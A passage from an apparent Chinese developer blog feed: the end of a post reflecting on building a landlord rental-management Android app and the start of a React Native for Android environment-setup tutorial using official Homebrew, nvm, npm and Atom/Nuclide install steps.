<p>短信推送服务：</p>
<ul>
<li>Submail、LeanCloud等第三方服务，相比价格，确定使用LeanCloud。</li>
</ul>
<p>由于考虑到这是一个二房东的房源管理平台，对房源图片的存储也是必不可少的，所以即使使用阿里云，使用Nginx作负载均衡，带宽也是不够的。所以需要选择一个云存储作为图床，这样的好处是可以利用第三方服务商为我们提供CDN加速，使得我们的应用服务器在较小的带宽的情况下，以较快的速度运行。</p>
<p>所以我选择了几个云存储供应商作为比较：</p>
<ul>
<li>阿里云，当然是第一反应，其次是七牛云存储，然后还有青云等等。<br>经过详细浏览后发现，阿里云虽然业务较广，但是对图片存储做的不是很细致，而且价格也比较贵，相反，七牛和青云在价格上面相对较低。我选择了七牛，因为七牛对图片的处理十分细致，使用七牛可以为以后的业务拓展奠定基础。</li>
</ul>
<h1 id="u4E8C_u3001_u7CFB_u7EDF_u6846_u67B6_u7684_u642D_u5EFA"><a href="#u4E8C_u3001_u7CFB_u7EDF_u6846_u67B6_u7684_u642D_u5EFA" class="headerlink" title="二、系统框架的搭建"></a>二、系统框架的搭建</h1><p>一个商业化的项目，当然少不了一个完善的框架做支撑，先来谈谈UI框架吧，在和我们的设计师进行沟通之后，我便提前设计开始搭建UI框架了（项目初期，我们的设计师即兼任交互又担任UI设计，后期才招了专门的UI和视觉）。<br>和一般的商业项目一样，项目UI主要是一个SplashActivity,然后主界面是4个Tab中间是一个可弹出对话框的<code>+</code>号。所以，主界面我才用了FragmentTabHost，然后里面分别是4个Fragment，里面具体细节只能在以后敲了。</p>
<p>除了UI之外，肯定少不了一些其他的工具类，例如：字符串处理类，文件处理类，缓存处理，数据库处理，设备信息，日期处理，动画处理，对话框等等一系列。这些只能靠自己平时的积累了。这个项目里的这些工具类大部分都是我以前积累的一些好的开源项目中借鉴过来的，然后在空余时间根据自己的编码风格进行修改的。我并不喜欢重复造轮子，闭门造车。</p>
<p>然后是网络请求框架了，当时我知道的2大著名的网络框架是：AsyncHttpClient和Volley。<br>我总结了一下:<br>Volley的特点主要有如下几点：</p>
<ul>
<li>能使网络通信更快，更简单，更健壮</li>
<li>Get、Post网络请求及网络图像的高效异步处理请求</li>
<li>可以对网络请求进行排序优先级管理</li>
<li>网络请求的缓存</li>
<li>多级别取消</li>
<li>和Activity声明周期的联动（Activity结束时同时取消所有网络请求）</li>
<li>使用Volley可以简化一些网络通信的开发，当然Volley不适合大数据（large payloads）和流媒体的网络请求。例如上百兆的文件、视频下载</li>
</ul>
<p>Asyn-cHttp是一款国外的开源框架。高效的网络数据请求，文件下载和上传。</p>
<ul>
<li>清晰的网络回调</li>
<li>请求使用ThreadPool，限制并发资源使用情况</li>
<li>Get/Post基于参数构建使用（RequestParams），方便</li>
<li>Multipart 文件上传，大数据上传下载</li>
<li>自动智能请求重试，优化了质量不一的移动连接</li>
<li>内置响应解析成JSON,使用JsonHttpResponseHandler</li>
<li>持久化cookie存储，保存cookie到你的应用程序的SharedPreferences</li>
<li>二进制文件（图片等）的下载，使用BinaryHttpResponseHandler</li>
</ul>
<p>思前想后，我还是决定使用<a href="https://github.com/loopj/android-async-http" target="_blank" rel="external">loopj</a>大神的<code>android-async-http</code>，至于为什么，可能是在对两个框架进行体验的时候更喜欢<code>android-async-http</code>的参数化请求以及大文件的上传吧。其实要究其功能，并无什么大的差别。对其做了一些封装，封装了一个<code>ApiHttpClient</code>出来在里面对AsyncHttpClient使用了单例模式，因为毕竟网络请求在一个应用中十分常见，可以共用同一个实例，在类中注明了各个常量,例如Host,url前缀等等，然后对<code>Post</code>、<code>Put</code>、<code>Get</code>、<code>Delete</code>进行封装，然后对这四个方法进行多参数的重载，使得在实际使用过程中总能找到一个自己所需要的方法进行调用。</p>
<p>然后我又写了一个类，对上述这个类进行调用，根据实际需求编写不同名称的网路请求的静态方法，对<code>ApiHttpClient</code>进行封装，每个方法都将网络请求返回时回调的AsynchttpHandler作为参数放入其中。这样对任何一个网络请求都可以进行简单明了的调用了。哦，忘了说了，在这个项目中采用了<code>stateless</code>的接口设计规范，和我之前做过的项目不一样，看了一篇博客感觉这样的设计将成为以后的主流，而且确实对于一部分需要用户认证，一部分不需要用户认证的API设计的时候，确实很有优势。博客地址如下,有兴趣的可以自己去看下：<br><a href="http://www.haomou.net/2014/08/13/2014_web_token/" target="_blank" rel="external">http://www.haomou.net/2014/08/13/2014_web_token/</a><br>其实说的通俗点，就是你在第一次登录的时候服务器给你返回一个按照相应规则生成的令牌，然后之后的请求，你就可以拿着这个令牌去访问服务器了。听着好傻，不过确实很实用。我的<code>token</code>是利用Java的<code>Property</code>存到文件中的，这样下次打开应用就无需重新登录了，第一次获取了<code>token</code>之后就把<code>token</code>存到Http协议的BasicAuth中可以了。</p>
<p>还有图片缓存框架，<code>Picasso</code>、<code>UniversalImageLoader</code>、<code>KjBitmap</code>（小众，开源中国的开源实验室出品），我选的是啥，我选的是<code>UniversalImageLoader</code>，原因其实很奇葩：<br><code>Picasso</code>没怎么用过，<code>KjBitmap</code>貌似刚出来不久，勉强可以，但是使用不够灵活，重点说说<code>UniversalImageLoader</code>，大三的时候，我和同学一起合作写一个校园论坛的客户端，他负责朋友圈这一块，用了这个框架，然而还不是引入第三方包的方法，直接拷贝的源代码，还不和我说，害得我以为是他写的（太牛了），然后默默地读了好几天源代码。过了一段时间才焕然大悟，居然偷用框架！！！所以说，我对<code>UniversalImageLoader</code>相对来说更加了解，以后也会找个机会分析分析它。</p>
<p>由于大型项目UI往往十分复杂，每个Activity或者Fragment中往往会有几十个控件，如果一个一个findViewById的话，累哭，现在不是很流行注解嘛，那就用一个，<a href="http://jakewharton.github.io/butterknife/" target="_blank" rel="external">ButterKnife</a>，看过相关资料，<code>ButterKnife</code>是一个编译级的注解，所以效率应该不会很差。</p>
<h1 id="u4E09_u3001_u8001_u751F_u5E38_u8C08_uFF0C_u9002_u914D_u95EE_u9898_u5982_u4F55_u89E3_u51B3_u5462"><a href="#u4E09_u3001_u8001_u751F_u5E38_u8C08_uFF0C_u9002_u914D_u95EE_u9898_u5982_u4F55_u89E3_u51B3_u5462" class="headerlink" title="三、老生常谈，适配问题如何解决呢"></a>三、老生常谈，适配问题如何解决呢</h1><p>屏幕适配，一直是Android的十分重要的问题，看过很多关于适配的文章，其中也有许多小技巧，有的甚至使用了一套代码来实现高质量的屏幕适配。但我觉得倒不必如此，在开发中尽量使用RelativeLayout、LinearLayout，多用weight属性，现在不是还出了百分比布局嘛，尺寸使用dp、sp，对于一些通常的机型这些都不是问题，像魅族这样比较特殊的可以单独适配。</p>
<p>在这个项目中，设计师是用sketch设计的，全部采用的矢量图，站在现在看，sketch确实十分强大，是移动设计的利器啊。但是唯一美中不足的是设计师给的是iOS的设计稿，没办法，对于细节只能自己调了。sketch中的1x、1.5x、2x、3x对应的是android中的mdpi、hdpi、xhdpi、xxhdpi，想着切着么多份图apk会很大，然而现在手机的性能也不再是瓶颈，所以我只切了xxhdpi的图，虽然在低分辨率的手机中，这些图片多占了内存，但是鱼与熊掌总是不能兼得的。在后来和一些已经入职的童鞋的交谈中，得知貌似大众点评也仅仅放了xxhdpi的图，那就心安理得了。</p>
<p>在sketch中切出的3x的图在android中显示的效果还不错。</p>
<h1 id="u56DB_u3001_u6F2B_u957F_u7684_u4EE3_u7801_u4E4B_u65C5"><a href="#u56DB_u3001_u6F2B_u957F_u7684_u4EE3_u7801_u4E4B_u65C5" class="headerlink" title="四、漫长的代码之旅"></a>四、漫长的代码之旅</h1><p>之后就是，无休止的业务逻辑，拿到高保真的设计稿，然后按照一比一的实现，在UI上倒真是花了不少功夫，一会贴图吧，这里只是抒发下开发的历程，细节就不讲了。</p>
<p>开发过程中，印象比较深刻的是，有一个问题，我居然困扰了一个星期。GridView中的图片错位，如果是原生的GridView的话还好。但是我用的是需要自适应高度的网格布局，继承了GridView，导致GridView在绘制的过程中，会出现多次测量的问题，然而其中的图片又是异步加载的，2种情况的叠加导致我陷入了无限的遐想。。。</p>
<p><a href="http://www.cnblogs.com/lesliefang/p/3619223.html" target="_blank" rel="external">http://www.cnblogs.com/lesliefang/p/3619223.html</a>这篇博客中的问题和我的问题大致类似，但并不完全一样，最后脑洞大开，直接用一个Holder保存每个item现实的时候加入判断就可以了。</p>
<p>当然开发中肯定不止遇到这一个坑，一些小问题都能在<code>BaiDu</code>上找到，百度找不到，那就<code>Google</code>，一般都能在<code>stackoverflow</code>上找到，真是一个神奇的网站。</p>
<p>但是有一个问题，我至今仍未解决，就是关于<code>JSON</code>解析的。当时用阿里的<code>FastJson</code>，原因是它自称是最快的解析框架，但是在解析范型嵌套类的时候居然不定时的出错，同样的代码执行时不定时出错，不能理解。后来去GitHub上面搜了一下，果然，吐槽的人一大堆。<br><a href="https://github.com/alibaba/fastjson/issues/330" target="_blank" rel="external">https://github.com/alibaba/fastjson/issues/330</a><br>当然我可以不用范型，但是我不愿放弃这么机智的通用的套路，尝试了一下<code>Gson</code>居然可以，那我就放弃了<code>FastJson</code>。希望有大神可以替我解答一下。</p>
<p>项目里的重大事故还有就是<a href="http://www.getui.com" target="_blank" rel="external">个推</a>，当时选用个推的原因是，因为它是浙大学长开发的，那就用吧。第一次集成的时候，退出应用的时候居然收不到消息通知和透穿消息，郁闷，然后从官网找到了技术支持，绕了半天，貌似是他们那里出了点问题，问题总算解决了。</p>
<p>后来项目快做完了，在做一些细化的工作，消息通知的设置，当时测试小米的时候，惊奇地发现，按照官方文档写的代码，小米手机退出应用后居然不能接收消息通知了。瞬间不开心了，去官网浏览了一下没有解决，换了一个测试机，华为荣耀、1+手机，我去，2个都可以，退出后依然可以收到。我深深体会到了android平台的多样性，多么广阔的天空啊，啥鸟都有～～。</p>
<p>一个星期之后，又去浏览官网，发现了一个新版本记得是2.6.1，试了一下，退出后小米手机倒是可以收到推送通知了。貌似应用退出后强制重启了进程。好吧，也就是说关不了了。不知道现在2.7.0这个版本改进了没。</p>
<h1 id="u4E94_u3001_u6DF7_u6DC6"><a href="#u4E94_u3001_u6DF7_u6DC6" class="headerlink" title="五、混淆"></a>五、混淆</h1><p>之前开发，从未混淆过，以至于，在引入第三方库的时候也没有注意需要<code>-keep</code>什么，导致结束时要一下子理清楚，谈何容易，于是乎，在和朋友交谈过程中，找到了一个偷懒的办法，<a href="http://dev.360.cn/m/protect.html" target="_blank" rel="external">360加壳技术</a>，很方便，直接相当于混淆了。原本以为万事大吉了，但是后来居然要搞自动化部署，用这个加壳技术显然是行不通了。于是乎又被迫走上了<code>Proguard</code>的混淆之路了。我没有特意修改混淆规则，貌似也不简单，用的是android的混淆规则。从头一个一个理清引用的第三方库的混淆配置，一个一个写到<code>proguard-rules.pro</code>里去，写了134行。终于可以了，谢天谢地。</p>
<p>知道怎么做了，当然要想为什么了，仅仅会写，就叫不思进取。。。其实仔细想一下也不难，混淆无非就是把你源代码中的类名、方法名、参数名按照一定规则改的面目全非，让人难以阅读嘛。改了之后，比如在<code>xml</code>中使用了自定义的控件，那么在代码中经过混淆，然而<code>xml</code>中并没有修改，所以就出错了。还有在<code>JSON</code>解析的时候，一般使用框架的话大多用到了范型机制，从网络传输过来的字符串肯定是按照没有混淆的时候写的，然而混淆过了之后，想用反射去实例化一个对象，那肯定不行了咯。我的理解大概就是这样的。如果有朋友了解的更深的话，欢迎探讨。</p>
<p>最近用<code>apktool</code>尝试了下对著名的一些app的反编译，发现大多对资源也进行混淆了。越来越机智了。这里给出一篇美团技术团队的资源混淆的教程。<br><a href="http://tech.meituan.com/mt-android-resource-obfuscation.html" target="_blank" rel="external">http://tech.meituan.com/mt-android-resource-obfuscation.html</a></p>
<h1 id="u516D_u3001_u591A_u6E20_u9053_u6253_u5305"><a href="#u516D_u3001_u591A_u6E20_u9053_u6253_u5305" class="headerlink" title="六、多渠道打包"></a>六、多渠道打包</h1><p>最近app要上线了，要发不到各大应用商店，我们的运营和我说，需要统计从每个渠道的下载量，和活跃度。我隐约想到了好像有个多渠道打包，也看过类似的文章，但是一直没有机会实践一下。那就乘着这个项目实践一下吧。</p>
<p>我用的是友盟统计，貌似还有个百度统计，发现用了Android Studio之后什么都变的方便了，在build.gradle中<code>productFlavors</code>里写相应的渠道名就可以替换<code>Manifest</code>中的相应渠道名了，总之不难，然后根据不同的渠道生成不同的apk名字就可以了，一天搞定。</p>
<h1 id="u4E03_u3001_u603B_u7ED3"><a href="#u4E03_u3001_u603B_u7ED3" class="headerlink" title="七、总结"></a>七、总结</h1><p>陆陆续续从苏州到宁波，开发了4个多月，差不多一套成熟的开发套路，我也走了一遍了，其中收获了很多，用了很多第三方的服务，视野也变开阔了，Git的使用频率变多了，GitHub逛的次数变多了，翻墙的频率是更多了。对Android的认识也更加进了一步。项目告一段落，是时候静心好好沉淀一下了。。。<br>貌似小米应用商店已经上线了：<br><a href="http://app.mi.com/detail/121871?ref=search" target="_blank" rel="external">http://app.mi.com/detail/121871?ref=search</a></p>
<p>团队介绍：<br><a href="http://www.inyouzi.com" target="_blank" rel="external">http://www.inyouzi.com</a></p>
<p>忘了最后的截图了，毕竟无图无真相:<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/inyouzi_1.jpg?imageView2/2/w/240/h/427" alt=""> <img src="http://7xoz2q.com1.z0.glb.clouddn.com/inyouzi_2.jpg?imageView2/2/w/240/h/427" alt=""> <img src="http://7xoz2q.com1.z0.glb.clouddn.com/inyouzi_3.jpg?imageView2/2/w/240/h/427" alt=""> <img src="http://7xoz2q.com1.z0.glb.clouddn.com/inyouzi_4.jpg?imageView2/2/w/240/h/427" alt=""> <img src="http://7xoz2q.com1.z0.glb.clouddn.com/inyouzi_5.jpg?imageView2/2/w/240/h/427" alt=""> <img src="http://7xoz2q.com1.z0.glb.clouddn.com/inyouzi_6.jpg?imageView2/2/w/240/h/427" alt=""> <img src="http://7xoz2q.com1.z0.glb.clouddn.com/inyouzi_7.jpg?imageView2/2/w/240/h/427" alt=""> <img src="http://7xoz2q.com1.z0.glb.clouddn.com/inyouzi_8.jpg?imageView2/2/w/240/h/427" alt=""> <img src="http://7xoz2q.com1.z0.glb.clouddn.com/inyouzi_9.jpg?imageView2/2/w/240/h/427" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[柚子房东这个项目，从7月中旬开始定需求，设计，开发，也经历了4个多月了，v1.0也算是上线了，来谈谈这几个月的感想吧。]]>
    
    </summary>
    
      <category term="创业项目，一个字“累”" scheme="http://www.xuanzhangjiong.xyz/tags/%E5%88%9B%E4%B8%9A%E9%A1%B9%E7%9B%AE%EF%BC%8C%E4%B8%80%E4%B8%AA%E5%AD%97%E2%80%9C%E7%B4%AF%E2%80%9D/"/>
    
      <category term="项目经历" scheme="http://www.xuanzhangjiong.xyz/categories/%E9%A1%B9%E7%9B%AE%E7%BB%8F%E5%8E%86/"/>
    
      <category term="作品" scheme="http://www.xuanzhangjiong.xyz/categories/%E9%A1%B9%E7%9B%AE%E7%BB%8F%E5%8E%86/%E4%BD%9C%E5%93%81/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[学习 React Native for Android：环境搭建]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/11/20/%E5%AD%A6%E4%B9%A0-React-Native-for-Android%EF%BC%9A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/11/20/学习-React-Native-for-Android：环境搭建/</id>
    <published>2015-11-20T13:07:42.000Z</published>
    <updated>2016-01-09T13:47:35.000Z</updated>
    <content type="html"><![CDATA[<p>Facebook 于 2015 年 9 月 15 日发布了 React Native for Android 。React Native 让开发者使用 JavaScript 和 React 编写应用，利用相同的核心代码就可以创建 Web，iOS 和 Android 平台的原生应用。注意这里的 核心 两个词，它指的是那些底层的、与界面无关的逻辑。与 ionic / PhoneGap 这类 Web App 开发框架不同，React Native 主张使用 React 的开发方式来开发 Native 应用，因为在现阶段 Web App 还无法达到 Native App 的体验。所以，React Native 并不强调 write Once, run everywhere ，而是 learn once, write everywhere ：上层使用 JS 和 React 开发不同平台的 UI，下层则可以编写能够复用的核心代码，从而大幅提高开发效率。</p>
<p>关于 React Native 的好处，唐巧在 <a href="http://blog.devtang.com/blog/2015/02/01/talk-about-react-native/" target="_blank" rel="external">《谈谈 React Native》</a> 里已经有比较深刻的总结，本文不再赘述。本文将作为一个 React Native for Android 学习系列的一个开篇，从零开始学习 React Native 。我尽量不偷懒，保证文章及时更新。</p>
<h1 id="u51C6_u5907_u5DE5_u4F5C"><a href="#u51C6_u5907_u5DE5_u4F5C" class="headerlink" title="准备工作"></a>准备工作</h1><ol>
<li>操作系统：当前仅支持 OS X；</li>
<li>由于 atom 的 package 服务 apm 国内不可用，因此国内的朋友需要做好 Cross the Wall 的准备。</li>
</ol>
<h1 id="u57FA_u672C_u5F00_u53D1_u73AF_u5883_u642D_u5EFA"><a href="#u57FA_u672C_u5F00_u53D1_u73AF_u5883_u642D_u5EFA" class="headerlink" title="基本开发环境搭建"></a>基本开发环境搭建</h1><h2 id="u5B89_u88C5_Homebrew"><a href="#u5B89_u88C5_Homebrew" class="headerlink" title="安装 Homebrew"></a>安装 Homebrew</h2><p>Homebrew 是一个方便开发者在 MAC OS X 系统上面安装 Linux 工具包的 ruby 脚本，如果你的机器还没有安装 Homebrew ，则需要执行下面的命令安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby <span class="operator">-e</span> <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>"</span></span><br></pre></td></tr></table></figure></p>
<p>完成后可以试试执行 brew -v 检查下 brew 是否安装成功。</p>
<p>如果你的机器已经安装过 Homebrew ，强烈建议 对 Homebrew 的包做一下更新：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">brew </span>update &amp;&amp; <span class="keyword">brew </span>upgrade</span><br></pre></td></tr></table></figure></p>
<h2 id="u5B89_u88C5_Node-js"><a href="#u5B89_u88C5_Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h2><p>建议使用 Node 的版本管理器 nvm 来安装新版本的 Node.js 。</p>
<h3 id="u5B89_u88C5_nvm"><a href="#u5B89_u88C5_nvm" class="headerlink" title="安装 nvm"></a>安装 nvm</h3><p>首先需要安装 nvm 。官方推荐的做法是通过 <code>curl</code> 或者 <code>wget</code> 来安装：</p>
<p>通过 curl 安装</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>brew install curl  <span class="comment"># 确保安装了 curl</span></span><br><span class="line"><span class="variable">$ </span>curl -o- <span class="symbol">https:</span>/<span class="regexp">/raw.githubusercontent.com/creationix</span><span class="regexp">/nvm/v</span>0.<span class="number">29.0</span>/install.sh | bash</span><br></pre></td></tr></table></figure>
<p>通过 wget 安装</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>brew install wget  <span class="comment"># 确保安装了 wget</span></span><br><span class="line"><span class="variable">$ </span>wget -qO- <span class="symbol">https:</span>/<span class="regexp">/raw.githubusercontent.com/creationix</span><span class="regexp">/nvm/v</span>0.<span class="number">29.0</span>/install.sh | bash</span><br></pre></td></tr></table></figure>
<p>完成后可以试试执行 <code>nvm --version</code> 检查下 nvm 是否安装成功。</p>
<h3 id="u5B89_u88C5_Node-js-1"><a href="#u5B89_u88C5_Node-js-1" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h3><p>使用 nvm 安装 Node.js：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nvm install <span class="keyword">node</span><span class="identifier"> </span><span class="title">&amp;&amp; nvm</span> alias default <span class="keyword">node</span><span class="identifier"></span><span class="title"></span></span><br></pre></td></tr></table></figure>
<h2 id="u5B89_u88C5_watchman"><a href="#u5B89_u88C5_watchman" class="headerlink" title="安装 watchman"></a>安装 watchman</h2><p>watchman 是 Facebook 的一个用于监控文件变更并触发指定操作的工具：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">brew </span>install watchman</span><br></pre></td></tr></table></figure>
<h2 id="u5B89_u88C5_flow"><a href="#u5B89_u88C5_flow" class="headerlink" title="安装 flow"></a>安装 flow</h2><p>Flow 是一个 JavaScript 的静态类型检查器，建议安装它，以方便找出代码中可能存在的类型错误：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">brew </span>install flow</span><br></pre></td></tr></table></figure>
<h2 id="u5B89_u88C5_Android_SDK"><a href="#u5B89_u88C5_Android_SDK" class="headerlink" title="安装 Android SDK"></a>安装 Android SDK</h2><p>如果你之前已经装过 Android SDK ，打开 Android SDK Manager，确保如下工具和开发包已经安装：</p>
<p>SDK：</p>
<ul>
<li>Android SDK Build-tools version 23.0.1</li>
<li>Android 6.0 (API 23)</li>
<li><p>Android Support Repository<br>模拟器：</p>
</li>
<li><p>Intel x86 Atom System Image (for Android 5.1.1 - API 22)</p>
</li>
<li>Intel x86 Emulator Accelerator (HAXM installer)<br>如果之前没有装过 Android SDK ，可以通过如下步骤安装：</li>
</ul>
<ol>
<li>安装最新的 JDK.</li>
<li>使用 brew install android-sdk 来安装安卓 SDK。</li>
<li>将它添加到 ~/.bashrc, ~/.zshrc 或者任何其他您的 shell 所使用的路径：export ANDROID_HOME=/usr/local/opt/android-sdk</li>
<li>启动一个新的 shell 并且运行 android ，在出现窗口中勾选上面列出的 SDK 和模拟器。</li>
<li>点击 “Install Packages”。<br>详细介绍可以参考 这篇文章 。</li>
</ol>
<h2 id="u5B89_u88C5_React_Native"><a href="#u5B89_u88C5_React_Native" class="headerlink" title="安装 React Native"></a>安装 React Native</h2><p>最后到了关键一步，安装 React Native：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm <span class="operator"><span class="keyword">install</span> -<span class="keyword">g</span> react-<span class="keyword">native</span>-cli</span></span><br></pre></td></tr></table></figure></p>
<p>至此完成 React Native 基本开发环境的搭建。</p>
<h1 id="Nuclide_IDE__u7684_u5B89_u88C5_u548C_u914D_u7F6E_uFF08_u53EF_u9009_uFF09"><a href="#Nuclide_IDE__u7684_u5B89_u88C5_u548C_u914D_u7F6E_uFF08_u53EF_u9009_uFF09" class="headerlink" title="Nuclide IDE 的安装和配置（可选）"></a>Nuclide IDE 的安装和配置（可选）</h1><p>Nuclide 是 Facebook 专门为 React 开发的 IDE ，既然是官方提供的 IDE ，就意味着拥有更好的语法补全、类型检查等支持。为了开发效率，不妨尝试一下这个 IDE 。</p>
<h2 id="u5B89_u88C5_Atom"><a href="#u5B89_u88C5_Atom" class="headerlink" title="安装 Atom"></a>安装 Atom</h2><p>本质上，Nuclide 其实是在 Atom 的基础上提供的一系列插件集。要使用 Nuclide ，首先需要先安装 Atom 。Atom 是 Github 所推出的一个开源编辑器，其最大的特点是使用 node.js 来作为其插件语言。</p>
<p>到Atom的官网下载 Atom 并安装。</p>
<h2 id="u5B89_u88C5_Nuclide"><a href="#u5B89_u88C5_Nuclide" class="headerlink" title="安装 Nuclide"></a>安装 Nuclide</h2><p>安装完 Atom 后，打开 Settings 面板，并点击 Install 选项卡，然后在搜索框中键入 nuclide-installer ，如图所示：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native-1.png" alt="搜索 nuclide-installer"></p>
<p>第一个结果就是我们需要安装的插件，点击该插件旁边的蓝色 Install 按钮进行安装。</p>
<p>另一种方法是直接利用 Atom 的包管理器 <code>apm</code> 安装：<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apm <span class="keyword">install</span> nuclide-installer</span><br></pre></td></tr></table></figure></p>
<p>完成后重启一下 Atom ，Atom 就会开始完成对 Nuclide 所有插件的下载安装，这个过程可能耗时比较长。完成后可以再次进入 Setting 面板，并点击 Packages 选项卡，你将可以看到一堆的 <code>Nuclide-</code> 开头的插件。</p>
<p>为了方便编译 React Native 的工程，建议再安装一个终端插件，用于快速打开终端并定位到当前项目根路径。根据你的操作系统版本选择安装如下插件之一：</p>
<ul>
<li>atom-terminal：适合 Mac OSX 10.9 （Mavericks） 及以下的操作系统；</li>
<li><p>atomerinal：atom-terminal 在 Mac OSX Yosmite 和 EI Capitan 下不能准确定位路径，这个插件是对 atom-terminal 的 fork 和修改，适合版本更高的操作系统；</p>
<h2 id="u5176_u4ED6_u63A8_u8350_u63D2_u4EF6"><a href="#u5176_u4ED6_u63A8_u8350_u63D2_u4EF6" class="headerlink" title="其他推荐插件"></a>其他推荐插件</h2><p>除了 Nuclide 之外，还可以根据你的需求安装其他的一些插件，这里推荐一些插件：</p>
</li>
<li><p>react：React 的语法补全和智能重排；</p>
</li>
<li>react-snippets：React 的代码段；</li>
<li>highlight-selected：高亮当前双击选中的标记；</li>
<li>jshint：检查 JavaScript 的语法，支持 JSX （需要在插件设置中开启 Support Linting JSX）；</li>
<li>emmet：用 emmet （Zen Coding）方式快速编写页面；</li>
<li>save-session：让 Atom 记住上一次打开的会话；</li>
<li>browser-plus：在 Atom 中内嵌一个浏览器窗口，方便页面调试（其实 Atom 本身就是一个浏览器）；</li>
<li>minimap：如果你对 Sublime Text 的 minimap 念念不忘；</li>
<li>atomic-emacs：Emacs 键盘布局，适合 Emacs 用户使用；</li>
<li>vim-mode：Vim 键盘布局，适合 Vim 用户使用。<br>但要注意，Atom 目前的性能还比较差强人意，安装太多的插件会影响整个编辑器的启动速度，所以建议只安装必需的插件。</li>
</ul>
<h1 id="u7B2C_u4E00_u4E2A_u5C0F_u7A0B_u5E8F_uFF1AAwesomeProject"><a href="#u7B2C_u4E00_u4E2A_u5C0F_u7A0B_u5E8F_uFF1AAwesomeProject" class="headerlink" title="第一个小程序：AwesomeProject"></a>第一个小程序：AwesomeProject</h1><p>执行如下命令生成一个工程：</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ react-<span class="keyword">native</span> init AwesomeProject</span><br></pre></td></tr></table></figure>
<p>该命令将会下载 React Native 工程源码和依赖，生成的工程文件如下图所示：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native_2.png" alt="生成的示例工程"></p>
<p>仔细观察这个工程，你会发现如下的内容：</p>
<ul>
<li>node_modules 文件夹，这是 Node.js 用来存放和管理 npm 包的文件夹，现在这里包含了 React Native 框架。</li>
<li>index.android.js 文件和 index.ios.js 文件。这是 React Native CLI 工具分别为 Android 和 iOS 创建的空壳应用。</li>
<li>android 文件夹和 ios 文件夹。包含了用于生成两个平台的 App 的 Bootstrap 型项目。</li>
</ul>
<p>现在打开 Atom ，点击 File 菜单的 【Add Project Folder…】 菜单项，导入 AwesomeProject 工程文件夹，如下图所示：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native_3.png" alt=""><br>通过终端插件快速打开终端（快捷键是 <code>Alt</code> + <code>Shift</code> + <code>t</code>），然后执行如下命令运行 Android 应用程序：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ react-<span class="keyword">native</span> run-android</span><br></pre></td></tr></table></figure></p>
<p>React Native 会开始构建这个工程，同时会启动 Running Packager 用于调试。如下图所示：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native_4.png" alt=""><br>如果 Running Packager 提示 “Packager can’t listen on port 8081” ，说明 8081 端口被占用，可以检查是什么程序占用了这个端口并杀掉它：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo lsof -n -i4TCP:<span class="number">8081</span> | grep LISTEN</span><br><span class="line">$ kill -<span class="number">9</span> &lt;进程id&gt;</span><br></pre></td></tr></table></figure></p>
<p>构建完成后，手机或模拟器将会自动运行这个 App 。如果你看到的是这样的画面：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native_5.png" alt=""><br>你还需要进行如下设置：</p>
<ol>
<li>更新 brew 和 watchman ：<code>brew update &amp;&amp; brew upgrade watchman</code>；</li>
<li>摇动手机或按下菜单按钮呼出菜单，然后点击 【DeviceID Settings】 菜单项进入应用的选项界面，再点击 【Debug server host for device】 选项，填入你的 Mac 主机的 ip ；<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native_6.png" alt=""></li>
<li>完成后重启一下应用，或者回到主界面再次呼出菜单，点击 【Reload JS】 。应用就会开始抓取主机上的 JS Bundle 并显示如下的界面：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native_7.png" alt=""></li>
</ol>
<p>我们的第一个应用就成功执行起来了！</p>
<p>现在试试对我们的工程做点改动。在 Atom 下打开 index.android.js 文件，并将第 20 行附件的<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">Hello</span> <span class="variable">World</span><span class="exclamation_mark">!</span></span><br></pre></td></tr></table></figure></p>
<p>改成<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">Hello</span> <span class="variable">HaHack</span><span class="exclamation_mark">!</span></span><br></pre></td></tr></table></figure></p>
